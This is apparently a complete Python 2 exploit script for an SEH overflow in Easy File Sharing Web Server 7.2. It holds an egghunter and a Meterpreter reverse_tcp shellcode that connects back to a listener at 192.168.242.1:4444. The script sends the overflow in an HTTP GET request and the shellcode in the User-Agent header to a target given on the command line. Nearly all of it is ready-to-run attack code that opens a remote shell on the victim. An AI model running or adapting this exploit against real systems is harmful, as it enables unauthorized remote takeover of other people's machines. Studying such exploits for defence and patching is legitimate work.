from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
from time import sleep

def bannder() :
	print """
# Exploit Title: Easy File Sharing Web Server 7.2 SEH Overflow with Egghunter
# Date: 08/01/2016
# Exploit Author: un4ckn0wl3z
	"""


if len(argv) != 2 :
	bannder()
	print "Usage: ./exploit <host>"
	exit(-1)

host = argv[1]

bannder()
sleep(3)

############################################
NSEH = "\x90\x90\xeb\x06" # jump short 6
SEH = "\xa3\x02\x01\x10" # 0x100102a3 : pop ebp # pop ebx # ret  |  {PAGE_EXECUTE_READ} [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll)
############################################
############################################
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.242.1 LPORT=4444 -f python -a x86 -b '\x00\x0a\x0c\x0d'

buf =  ""
buf += "\xd9\xc0\xbf\x54\x0f\xdd\xfa\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x54\x83\xee\xfc\x31\x7e\x14\x03\x7e\x40\xed"
buf += "\x28\x06\x80\x73\xd2\xf7\x50\x14\x5a\x12\x61\x14\x38"
buf += "\x56\xd1\xa4\x4a\x3a\xdd\x4f\x1e\xaf\x56\x3d\xb7\xc0"
buf += "\xdf\x88\xe1\xef\xe0\xa1\xd2\x6e\x62\xb8\x06\x51\x5b"
buf += "\x73\x5b\x90\x9c\x6e\x96\xc0\x75\xe4\x05\xf5\xf2\xb0"
buf += "\x95\x7e\x48\x54\x9e\x63\x18\x57\x8f\x35\x13\x0e\x0f"
buf += "\xb7\xf0\x3a\x06\xaf\x15\x06\xd0\x44\xed\xfc\xe3\x8c"
buf += "\x3c\xfc\x48\xf1\xf1\x0f\x90\x35\x35\xf0\xe7\x4f\x46"
buf += "\x8d\xff\x8b\x35\x49\x75\x08\x9d\x1a\x2d\xf4\x1c\xce"
buf += "\xa8\x7f\x12\xbb\xbf\xd8\x36\x3a\x13\x53\x42\xb7\x92"
buf += "\xb4\xc3\x83\xb0\x10\x88\x50\xd8\x01\x74\x36\xe5\x52"
buf += "\xd7\xe7\x43\x18\xf5\xfc\xf9\x43\x91\x31\x30\x7c\x61"
buf += "\x5e\x43\x0f\x53\xc1\xff\x87\xdf\x8a\xd9\x50\x20\xa1"
buf += "\x9e\xcf\xdf\x4a\xdf\xc6\x1b\x1e\x8f\x70\x8a\x1f\x44"
buf += "\x81\x33\xca\xf1\x84\xa3\x35\xad\x75\x32\xde\xac\x79"
buf += "\x25\x42\x38\x9f\x15\x2a\x6a\x30\xd5\x9a\xca\xe0\xbd"
buf += "\xf0\xc4\xdf\xdd\xfa\x0e\x48\x77\x15\xe7\x20\xef\x8c"
buf += "\xa2\xbb\x8e\x51\x79\xc6\x90\xda\x88\x36\x5e\x2b\xf8"
buf += "\x24\xb6\x4a\x02\xb5\x46\xe7\x02\xdf\x42\xa1\x55\x77"
buf += "\x48\x94\x92\xd8\xb3\xf3\xa0\x1f\x4b\x82\x90\x54\x7d"
buf += "\x10\x9d\x02\x81\xf4\x1d\xd3\xd7\x9e\x1d\xbb\x8f\xfa"
buf += "\x4d\xde\xd0\xd6\xe1\x73\x44\xd9\x53\x27\xcf\xb1\x59"
buf += "\x1e\x27\x1e\xa1\x75\x34\x59\x5d\x0b\x18\xc2\x36\xf3"
buf += "\x1c\xf2\xc6\x99\x9c\xa2\xae\x56\xb3\x4d\x1f\x96\x1e"
buf += "\x06\x37\x1d\xce\xe4\xa6\x22\xdb\xa9\x76\x22\xef\x71"
buf += "\x6e\xad\x10\x86\x8f\x4f\x2d\x50\xb6\x25\x76\x60\x8d"
buf += "\x36\xcd\xc5\xa4\xdc\x2d\x59\xb6\xf4"

############################################
############################################
# EggHunter = "w00t"
egg = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egg += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
############################################
shellcode = buf
############################################
fuzzA = "A" * 4061 + NSEH + SEH + "\x90" * 24 + egg + "\x90" * (5000-4061-4-4-len(egg))
############################################
payload = "GET "+ fuzzA +" HTTP1.1\r\n"
payload += "Host: "+ host +"\r\n"
payload += "User-Agent: w00tw00t" + shellcode + "\r\n"

try :
	sock = socket(AF_INET, SOCK_STREAM)
	sock.connect((host,80))
	print "FuzzA Length: " + str(len(fuzzA))
	print "Shellcode Length: " + str(len(shellcode))
	print "Payload Lenght: " + str(len(payload))
	print "[+] Sending Payload....."
	sock.send(payload)
	sock.close()
	print "[+] Trying to recive reverse shell from target..."
except :
	print "[!] Whoops!! Something went wrong?"
finally :
	print "\n[+] I <3 SHELLS"
